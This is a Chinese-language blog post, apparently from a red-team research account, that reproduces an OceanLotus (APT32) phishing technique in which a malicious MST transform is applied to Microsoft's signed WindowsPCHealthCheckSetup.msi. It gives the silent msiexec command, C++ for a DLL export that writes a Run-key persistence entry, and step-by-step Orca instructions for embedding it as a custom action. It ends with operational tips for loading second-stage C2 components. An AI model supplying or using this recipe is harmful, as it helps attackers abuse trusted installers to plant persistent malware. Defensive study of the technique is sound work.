#  海莲花对MSI文件滥用的新手法——MST文件白加黑复现   
原创 网络保安29  红蓝攻防研究实验室   2025-02-15 11:03  
  
# 0x00 前言  
  
看到一篇QAX之前对海莲花攻击活动的分析文章：  
  
https://mp.weixin.qq.com/s/alaZxCd61gJNI9D01eQzgg  
  
研究了下里面提到的初始钓鱼样本如何复现。原文中的大致样本信息如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/975QoDl7XibSvoPdZSiaUoouGvTWibxUXjR9JGNKvib87R24fIhbFb4QM9txFiaeHBfIETyRfyNNNEP5wAaDonuibQgQ/640?wx_fmt=other&from=appmsg "")  
  
海莲花组织通过 lnk 执行了如下命令行：  
  
```
msiexec.exe /qn /i WindowsPCHealthCheckSetup.msi TRANSFORMS=msGFG.mst
```  
  
  
其中 WindowsPCHealthCheckSetup.msi 为微软官方提供的合法安装包。  
MST 内部的 DLL 模块中的导出函数中可以实现落地额外的 DLL 和持久化操作。需要注意的是原文中提及的  
两个导出函数 LogSetupAfterInstall 和 LogSetupBeforeInstall 是海莲花样本特性而非MST文件结构特性。  
  
也就是说通过具有合法签名的msi文件加载了恶意的mst文件。  
# 0x01 MSI 文件结构  
  
首先需要了解一下MSI文件的结构，可以看这篇文章：  
  
https://intezer.com/blog/incident-response/how-to-analyze-malicious-msi-installer-files/  
  
下面再简单写一下比较重要的部分。  
  
MSI 文件是 Windows Installer 使用的安装包格式，它包含应用程序安装所需的所有信息，如文件、注册表项、快捷方式等，以及各种安装动作和执行顺序，如文件创建、注册表写入、快捷方式创建等等。MSI 文件的核心是一个关系数据库，通过数据库形式存储这些信息，包含多个表，每个表负责不同的安装任务。可以使用Orca工具查看MSI文件结构：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSvoPdZSiaUoouGvTWibxUXjRjDv9ktBkWibQdFkqDzia1m2SkUWufPIRJovv5dbf0riaXhM2yhyvjgyEg/640?wx_fmt=png&from=appmsg "")  
  
在样本分析和样本制作中，以下三个表需要重点关注：  
  
**1.1 CustomAction 表**  
  
用于定义在安装过程中执行的自定义操作，可以包括运行脚本、调用外部  
程序、修改系统设置等。包含以下关键字段：  
  
Action  
：自定义操作名，唯一标识符。  
  
Type  
：操作的类型，常见类型：  
```
1：运行 DLL 中的函数。
2：运行 EXE 文件。
5：运行 JScript 或 VBScript。
6：运行安装程序中的二进制数据。
19：运行 PowerShell 脚本。
```  
  
**Source**  
：操作的源，可以是 DLL、EXE 文件、脚本等。  
  
**Target**  
：操作的目标，如 DLL 的导出函数或脚本代码。  
  
**ExtendedType**  
：扩展类型，提供额外信息，如脚本类型。  
  
**Condition**  
：执行操作的条件。  
  
自定义操作可以在安装过程的不同阶段执行，常见执行时机：  
```
InstallUISequence：在用户界面模式下执行。
InstallExecuteSequence：在安装阶段执行。
AdminUISequence：在管理员模式下执行。
AdminExecuteSequence：在管理员执行阶段执行。
```  
  
**1.2 Binary 表**  
  
用于存储二进制数据，这些数据可以在安装过程中使用。数据内容可以是自定义操作的脚本、图标、外部程序等。Binary表中的数据可以通过 CustomAction 表引用并在安装过程中执行。Binary表包含以下主要字段：  
  
**Name**  
：自定义的二进制数据唯一标识名称。  
  
**Data**  
：文件或脚本的二进制数据，以十六进制格式存储。  
  
**1.3 InstallExecuteSequence 表**  
  
InstallExecuteSequence 表用于定义在安装执行阶段执行的各种操作及其顺序。这些操作包括文件复制、注册表写入、快捷方式创建等。每个操作都有一个唯一的名称和一个序列号，序列号决定了操作的执行顺序。  
该表包含以下主要字段：  
  
**Action**  
：操作的名称，可以是标准操作，如 InstallInitialize（初始化安装过程）、InstallFiles（将文件复制到目标目录）、WriteRegistryValues（写入注册表项） 等，也可以是 CustomAction 表中的自定义操作。  
  
**Condition**  
：操作执行的条件（可选）。  
  
**Sequence**  
：操作的执行顺序。序列号越小，操作越早执行。  
  
多数恶意MSI样本会选择在   
InstallExecuteSequence 安装阶段执行恶意的 CustomAction 自定义操作。  
# 0x03 MSI Transform 文件  
  
MST 文件是一种用于修改或定制 MSI 文件的文件格式，用于在不修改原始 MSI 文件的情况下，对安装过程进行定制化配置，可以通过添加、删除或修改 MSI 文件中的表、行或数据来实现对安装包的修复或更新。  
  
**3.1 MST 文件与 MSI 文件的关系**  
：  
  
MST 文件本质上是一个差异数据库文件，它记录了与原始 MSI 文件的差异，仅包含对原始 MSI 的增删改操作。也就是说MST 文件只包含需要修改的部分，而不是完整的 MSI 文件内容。例如，如果仅仅是需要修改如安装路径，MST 文件只会包含对 Property 表中安装路径属性的修改，而不会包含的表或数据。  
  
MST文件本身不独立运行，必须依附于 MSI，在安装 MSI 文件时，通过命令行参数指定 MST 文件：msiexec /i xxx.msi TRANSFORMS=xxx.mst；  
  
MST 文件不会改变原始 MSI 文件的内容，而是在安装时动态应用修改。当 MSI 文件与 MST 文件一起使用时，Windows Installer 会先在内存中先将 MST 文件中的修改应用到 MSI 文件上，生成一个临时的“虚拟 MSI”，然后再执行安装过程。  
  
**3.2 MST 白加黑利用思路**  
：  
  
寻找一个具有合法签名的 MSI 文件，创建它的 MST 文件，在其中添加   
CustomActio  
n 自定义操作（例如执行一个 DLL 中的导出函数，或者执行恶意脚本代码等），并添加 DLL/脚本 的 Binary 数据，将自定义操作添加到安装执行的流程中；  
  
然后生成对应的 MST 文件  
后与合法 MSI 文件一起投递，通过脚本或快捷方式执行带 TRANSFORMS 参数的 MSI 文件安装。  
# 0x04 复现过程  
  
这里我选择的自定义动作是执行DLL的导出函数。  
  
先准备一个DLL，导出一个包含恶意逻辑的函数，像海莲花应该是释放了下一阶段的白加黑组件并将其写入了启动项。这里我就简单写了个注册表启动项。注意这个导出函数需要一个 MSIHANDLE 类型的参数：  
```
extern "C" __declspec(dllexport) UINT __stdcall RunMyCode(MSIHANDLE hInstall) {
    // 懒得写了，假设这里是恶意程序或后续白+黑组件的拉取或释放
    // ......
    // 持久化
    HKEY hKey;
    LSTATUS status = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &hKey
    );

    if (status == ERROR_SUCCESS) {
        const char* exePath = "C:\\Program Files\\Test\\test.exe";
        status = RegSetValueExA(
            hKey,
            "Malware",
            0,
            REG_SZ,
            (const BYTE*)exePath,
            (DWORD)(strlen(exePath) + 1)
        );
        RegCloseKey(hKey);
    }
    return ERROR_SUCCESS; // 必须返回ERROR_SUCCESS否则MSI会回滚安装
}
```  
  
寻找一个合法的 MSI，我也是用了微软的 WindowsPCHealthCheckSetup.msi ，然后将其放入Orca 中，选择新   
Transform 文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSvoPdZSiaUoouGvTWibxUXjRiaq89dnsnxGGMyjq3wfpVwiamsVGLSTY9qAzWsC93rCG8Qt155sLow3g/640?wx_fmt=png&from=appmsg "")  
  
然后添加DLL的二进制数据到 Binary 表中，命名为MyDll：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSvoPdZSiaUoouGvTWibxUXjROp3jh8wloODK4hGfuHAFJbkvNQDEMLTwb3pXJdvhiab3wVdYTUbouMg/640?wx_fmt=png&from=appmsg "")  
  
然后添加自定义操作，操作命名为RunMyDll；Type 为1表示要运行 DLL 中的函数；Source   
为 DLL 二进制数据，也就是 MyDll；Target 为目标函数，也就是 DLL 中导出的 RunMyCode 函数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSvoPdZSiaUoouGvTWibxUXjRxV2PCXVuaJicVurEGxkKMA0WibiaYE3iaZXHN7ZXMN8cAZ3SGmIF1ibSCpg/640?wx_fmt=png&from=appmsg "")  
  
最后将自定义操作添加到   
InstallExecuteSequence ，在安装过程中执行我们的自定义操作RunMyDll，序列号我设置为了1510，在初始化动作之后，算是比较靠前了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSvoPdZSiaUoouGvTWibxUXjRCcOPk5k8r8A9pSW7YWiaWw7NYZAmrqzNpRkOF8mhPzsDC69QbYRQowQ/640?wx_fmt=png&from=appmsg "")  
  
选择生成   
Transform ，就能得到 MST 文件了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSvoPdZSiaUoouGvTWibxUXjRRn1Z1ic0ibvLPFUJLE6JDlxE2poriciaX2Ezednj9wibxozBeoKdNKZcU5Q/640?wx_fmt=png&from=appmsg "")  
  
先通过非隐藏安装方式运行一下，确认安装过程不会报错，成功安装了电脑健康检查软件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSvoPdZSiaUoouGvTWibxUXjRzm1YbP5nolMoMI4ymfdmKeut3rQRa5wiafaJApOk5siaTvyQ9CrfJFIg/640?wx_fmt=png&from=appmsg "")  
  
持久化注册表也成功写入了，说明我们自定义的导出函数被成功执行，而且没有影响软件的正常安装：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSvoPdZSiaUoouGvTWibxUXjRiczkibZLn8qKibR6wv71Ny1icXs2dGqVgfwWEkW90pjYTl8axPGMqm1f6w/640?wx_fmt=png&from=appmsg "")  
  
不过尽量不要在函数中直接执行 C2 通信 shellcode，否则可能会把安装过程卡住，建议注入到其他进程或拉取/释放二阶段攻击组件来上线。  
  
  
**注：本文内容仅用于研究学习，不可用于网络攻击等非法行为，否则造成的后果均与本文作者和本公众号无关，维护网络安全人人有责~**  
  
****  
**来啊，一起当保安↓↓**  
  
  
  
  
  
  
  
  
  
  
  
